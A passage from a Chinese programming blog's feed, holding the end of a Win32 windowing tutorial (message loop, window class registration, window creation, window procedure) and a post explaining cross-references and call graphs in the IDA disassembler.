class="params">(  CONST MSG *lpMsg   <span class="comment">// message information);</span></span></span></span><br></pre></td></tr></table></figure><p>该函数用于处理键盘消息。将虚拟码消息转换为字符消息</p><h5 id="DispatchMessage"><a href="#DispatchMessage" class="headerlink" title="DispatchMessage"></a>DispatchMessage</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">DispatchMessage</span><span class="params">(  CONST MSG *lpmsg   <span class="comment">// message information);</span></span></span></span><br></pre></td></tr></table></figure><p>该函数作用为将消息分发给窗口</p><h3 id="注册窗口类的自定义函数"><a href="#注册窗口类的自定义函数" class="headerlink" title="注册窗口类的自定义函数"></a>注册窗口类的自定义函数</h3><p>在WinMain()函数中，首先调用的是<strong>MyRegisterClass</strong>函数，该函数是我们自定义的函数，需要传递进程的实例句柄hInstance作为参数。</p><p>该函数完成窗口类的注册分为两步：</p><ol><li>填充<strong>WNDCLASSEX</strong>结构体 。这个步骤较为复杂</li><li>调用<strong>RegisterClassEx</strong>函数进行注册</li></ol><p>下面代码介绍了<strong>WNDCLASSEX</strong>结构体的所有成员，其中最重要的字段为<strong>lpfnWndProc</strong>，他将保存窗口的过程地址。窗口的过程是对各种消息进程处理的**”汇聚地”**</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ATOM <span class="title">MyRegisterClass</span><span class="params">(HINSTANCE hInstance)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WNDCLASSEX WndCls;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充结构体为0</span></span><br><span class="line">ZeroMemory(&amp;WndCls, <span class="keyword">sizeof</span>(WNDCLASSEX));</span><br><span class="line"></span><br><span class="line"><span class="comment">//cbSize是结构体大小</span></span><br><span class="line">WndCls.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//lpfnWndProc是窗口过程地址</span></span><br><span class="line">WndCls.lpfnWndProc = WindowProc;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//hInstance是实例句柄</span></span><br><span class="line">WndCls.hInstance = hInstance;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//lpszClassName是窗口类类名</span></span><br><span class="line">WndCls.lpszClassName = CLASSNAME;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//style是窗口类风格</span></span><br><span class="line">WndCls.style = <span class="number">0x01</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//hbrBackground是窗口类背景色</span></span><br><span class="line">WndCls.hbrBackground = (HBRUSH)COLOR_WINDOWRARME + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//hCursor是鼠标句柄</span></span><br><span class="line">WndCls.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//hIcon是图标句柄</span></span><br><span class="line">WndCls.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_QUESTION);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//其他</span></span><br><span class="line">WndCls.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">WndCls.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> RegisterClassEx(&amp;WndCls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建主窗口并显示更新"><a href="#创建主窗口并显示更新" class="headerlink" title="创建主窗口并显示更新"></a>创建主窗口并显示更新</h3><p>注册窗口类后，根据该窗口类创建具体的主窗口并显示和更新窗口</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建窗口函数</span></span><br><span class="line"><span class="function">BOOL <span class="title">InitInstance</span><span class="params">(HINSTANCE hInstance, <span class="keyword">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND hWnd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">hWnd = CreateWindowEx(WS_EX_CLIENTEDGE,</span><br><span class="line">   <span class="string">&quot;HelloWin32&quot;</span>,</span><br><span class="line">   <span class="string">&quot;MyFirstWindow&quot;</span>,</span><br><span class="line">   WS_OVERLAPPEDWINDOW,</span><br><span class="line">   CW_USEDEFAULT, <span class="comment">//窗口弹出的x轴</span></span><br><span class="line">   CW_USEDEFAULT, <span class="comment">//弹出的y轴</span></span><br><span class="line">   CW_USEDEFAULT, <span class="comment">//窗口宽</span></span><br><span class="line">   CW_USEDEFAULT, <span class="comment">//窗口高</span></span><br><span class="line">   <span class="literal">NULL</span>,  <span class="comment">//父窗口</span></span><br><span class="line">   <span class="literal">NULL</span>,          <span class="comment">//菜单窗口</span></span><br><span class="line">   hInstance,     <span class="comment">//当前窗口句柄</span></span><br><span class="line">   <span class="literal">NULL</span>);        </span><br><span class="line"><span class="keyword">if</span>( <span class="literal">NULL</span> == hWnd )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示窗口</span></span><br><span class="line">ShowWindow(hWnd, nCmdShow);</span><br><span class="line"><span class="comment">//更新窗口</span></span><br><span class="line">UpdateWindow(hWnd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用该函数，需要给该函数传递示例句柄和窗口的显示方式两个参数。分别为WinMain()函数的第1个参数和第3个参数。</p><p>创建主窗口时调用了CreateWindowEx()函数，通过MSDN查得函数原型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HWND <span class="title">CreateWindowEx</span><span class="params">(  DWORD dwExStyle,      <span class="comment">// extended window style</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpClassName,  <span class="comment">// registered class name</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpWindowName, <span class="comment">// window name  DWORD dwStyle,        // window style</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> x,                <span class="comment">// horizontal position of window</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> y,                <span class="comment">// vertical position of window</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nWidth,           <span class="comment">// window width  int nHeight,          // window height</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HWND hWndParent,      <span class="comment">// handle to parent or owner window</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HMENU hMenu,          <span class="comment">// menu handle or child identifier</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HINSTANCE hInstance,  <span class="comment">// handle to application instance</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpParam        <span class="comment">// window-creation data</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>第2个参数是<strong>lpClassName</strong>,根据注释，该参数为已注册类名。这个已经注册的类名就是<strong>WNDCLASSEX</strong>结构体的<strong>lpszClassName</strong>字段</p><h3 id="处理消息的窗口过程"><a href="#处理消息的窗口过程" class="headerlink" title="处理消息的窗口过程"></a>处理消息的窗口过程</h3><h4 id="WindowProc函数介绍"><a href="#WindowProc函数介绍" class="headerlink" title="WindowProc函数介绍"></a>WindowProc函数介绍</h4><p>窗口过程的定义是按照MSDN上给出的形式进行定义的，MSDN中的定义如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(  HWND hwnd,      <span class="comment">// handle to window</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT uMsg,      <span class="comment">// message identifier</span></span></span></span><br><span class="line"><span class="function"><span class="params">  WPARAM wParam,  <span class="comment">// first message parameter</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPARAM lParam   <span class="comment">// second message parameter);</span></span></span></span><br></pre></td></tr></table></figure><p>WindowProc是窗口过程的函数名，这个函数名可以随意改变，但是窗口过程的函数名必须与<strong>WNDCLASSEX</strong>结构体中<strong>lpfnWndProc</strong>的成员变量的值一致。下面介绍参数</p><ul><li>参数1：窗口句柄</li><li>参数2：消息值uMsg</li><li>参数3与参数4：这两个参数是对于消息值的附加参数，具体用法需要参照MSDN</li></ul><p>此函数也被称为回调函数，下面为消息回调函数代码 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HWND hwnd,</span></span></span><br><span class="line"><span class="function"><span class="params">UINT uMsg,</span></span></span><br><span class="line"><span class="function"><span class="params">WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PAINTSTRUCT ps;</span><br><span class="line">HDC hDC;</span><br><span class="line">RECT rt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *pszDrawText = <span class="string">&quot;Hello Windows Program&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">&#123;</span><br><span class="line">hDC = BeginPaint(hwnd, &amp;ps);</span><br><span class="line">GetClientRect(hwnd, &amp;rt);</span><br><span class="line">DrawTextA(hDC,</span><br><span class="line">pszDrawText, <span class="built_in">strlen</span>(pszDrawText),&amp;rt,</span><br><span class="line">DT_CENTER | DT_VCENTER | DT_SINGLELINE);</span><br><span class="line">EndPaint(hwnd, &amp;ps);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(IDYES == MessageBox(hwnd, <span class="string">&quot;是否退出程序&quot;</span>, <span class="string">&quot;MyFirstWin&quot;</span>, MB_YESNO))</span><br><span class="line">&#123;</span><br><span class="line">DestroyWindow(hwnd);</span><br><span class="line">PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="DefWindowProc介绍"><a href="#DefWindowProc介绍" class="headerlink" title="DefWindowProc介绍"></a>DefWindowProc介绍</h4><p>Windows的消息种类有上千种，但我们只需要处理程序需要的几种消息，其余的都交给系统处理，<strong>DefWindowProc</strong>函数就是进行不需要消息的处理</p><p>MSDN对<strong>DefWindowProc</strong>函数的定义如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">DefWindowProc</span><span class="params">(  HWND hWnd,      <span class="comment">// handle to window</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT Msg,       <span class="comment">// message identifier</span></span></span></span><br><span class="line"><span class="function"><span class="params">  WPARAM wParam,  <span class="comment">// first message parameter</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPARAM lParam   <span class="comment">// second message parameter);</span></span></span></span><br></pre></td></tr></table></figure><p>这四个参数跟窗口过程参数相同。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;WIn32窗口应用程序主函数-WinMain&quot;&gt;&lt;a href=&quot;#WIn32窗口应用程序主函数-WinMain&quot; class=&quot;headerlink&quot; title=&quot;WIn32窗口应用程序主函数:WinMain()&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="Windows" scheme="http://example.com/categories/Windows/"/>
    
    <category term="win32" scheme="http://example.com/categories/Windows/win32/"/>
    
    <category term="线程" scheme="http://example.com/categories/Windows/win32/%E7%BA%BF%E7%A8%8B/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>🕵️‍♂️IDA中交叉引用和绘图功能</title>
    <link href="http://example.com/2020/10/28/IDA/IDA%E4%BA%A4%E5%8F%89%E5%BC%95%E7%94%A8%E4%B8%8E%E7%BB%98%E5%9B%BE%E5%8A%9F%E8%83%BD/"/>
    <id>http://example.com/2020/10/28/IDA/IDA%E4%BA%A4%E5%8F%89%E5%BC%95%E7%94%A8%E4%B8%8E%E7%BB%98%E5%9B%BE%E5%8A%9F%E8%83%BD/</id>
    <published>2020-10-28T12:52:10.578Z</published>
    <updated>2021-02-05T06:31:35.501Z</updated>
    
    <content type="html"><![CDATA[<img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028204707882.png" alt="" style="zoom: 25%;" /><a id="more"></a><p><strong>文章所使用源码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">depth_2_1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;inside depth_2_1\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">depth_2_2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;inside depth_2_2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">depth_1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   depth_2_1();</span><br><span class="line">   depth_2_2();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;inside depth_1\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   depth_1();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="交叉引用"><a href="#交叉引用" class="headerlink" title="交叉引用"></a>交叉引用</h4><p>交叉引用分为两种类型</p><ol><li><strong>代码交叉引用</strong></li></ol><ul><li><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028105437882.png"></li></ul><ol start="2"><li><strong>数据交叉引用</strong></li></ol><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028105538721.png"></p><h4 id="交叉引用源头解释"><a href="#交叉引用源头解释" class="headerlink" title="交叉引用源头解释"></a>交叉引用源头解释</h4><p>交叉引用源头一共有4个部分组成`</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028110418024.png"></p><ul><li><p>组成1：引用者名字</p><p>表示是在<strong>___tmainCRTStartup</strong>的函数中提出引用 </p></li><li><p>组成2：开始字节</p><p>15A表示引用开始是在函数的第0x15A个字节处</p></li><li><p>组成3：引用位置相对目前的位置</p><p>箭头表示引用位置的相对方向，图中箭头向下，表示操作者需要向下滑动才可以看到，反之亦然</p></li><li><p>组成4：识别后缀</p><ul><li>在IDA中，指令转交控制权的方式叫做流。IDA中有3中基本流：普通流，跳转流，基本流</li></ul><table><thead><tr><th align="left">类型</th><th>英文名称</th></tr></thead><tbody><tr><td align="left">普通流</td><td>ordinary flow</td></tr><tr><td align="left">跳转流</td><td>jump flow</td></tr><tr><td align="left">调用流</td><td>call flow</td></tr></tbody></table><ul><li>后缀意义</li></ul><table><thead><tr><th>符号</th><th>引用方式</th><th>全称</th></tr></thead><tbody><tr><td>p</td><td>代码交叉引用</td><td>Procedure</td></tr><tr><td>w</td><td>写入交叉引用</td><td>write</td></tr><tr><td>r</td><td>读取交叉引用</td><td>read</td></tr><tr><td>o</td><td>偏移交叉引用</td><td>offset(偏移)</td></tr></tbody></table></li></ul><h4 id="交叉引用列表"><a href="#交叉引用列表" class="headerlink" title="交叉引用列表"></a>交叉引用列表</h4><p>  快捷键X，可以显示所有的交叉引用源，在这个文件中，write_it只被调用了三次</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028122835393.png"></p><h4 id="函数列表"><a href="#函数列表" class="headerlink" title="函数列表"></a>函数列表</h4><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028123515652.png"></p><h4 id="函数外部调用图"><a href="#函数外部调用图" class="headerlink" title="函数外部调用图"></a>函数外部调用图</h4><ul><li>IDA函数调用图</li></ul><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028124526033.png" alt="" style="zoom:67%;" /><h4 id="外部交叉引用图"><a href="#外部交叉引用图" class="headerlink" title="外部交叉引用图"></a>外部交叉引用图</h4><p>外部交叉引用有两种类型</p><ul><li><strong>目标符号</strong>交叉引用 [Xrefs <strong>To</strong>]</li><li><strong>源符号</strong>交叉引用 [Xrefs <strong>From</strong>]</li></ul><h5 id="Xrefs-To"><a href="#Xrefs-To" class="headerlink" title="Xrefs To"></a>Xrefs To</h5><p>​    IDA生成<strong>“交叉引用目标”</strong>图形，必须执行递归上升操作，即回溯所有以选定目标的符号为目标的交叉引用，直到到达一个没有其他符号引用的符号</p><ul><li>puts函数(printf函数)<strong>XrefsTo图形</strong>，显示了所有到达puts函数的路径</li></ul><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028125217629.png" alt="" style="zoom:67%;" /><h5 id="Xrefs-From"><a href="#Xrefs-From" class="headerlink" title="Xrefs From"></a>Xrefs From</h5><p>​                    生成<strong>“交叉引用源头”</strong>图，需要执行递归下降操作，即跟踪所有以选定的符号为源头的交叉引用</p><ul><li>main函数<strong>“交叉引用源头图”</strong></li></ul><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028203719048.png" alt="" style="zoom: 80%;" /><ul><li>depth_1函数<strong>“交叉引用源头图”</strong></li></ul><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028204040474.png" alt="" style="zoom:67%;" /><h5 id="简单理解"><a href="#简单理解" class="headerlink" title="简单理解"></a>简单理解</h5><ul><li><p>To表示源头，IDA可以递归出所有到达该源头的路径</p></li><li><p>From表示目标，IDA从选定处源头开始递归，找到从从源头开始的所有路径</p></li></ul><p>对IDA来说来说To就是IDA从目标处向上递归，From就是IDA从目标处向下递归</p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028204707882.png&quot; alt=&quot;&quot; style=&quot;zoom: 25%;&quot; /&gt;</summary>
    
    
    
    <category term="IDA" scheme="http://example.com/categories/IDA/"/>
    
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="IDA" scheme="http://example.com/tags/IDA/"/>
    
  </entry>
  
</feed>
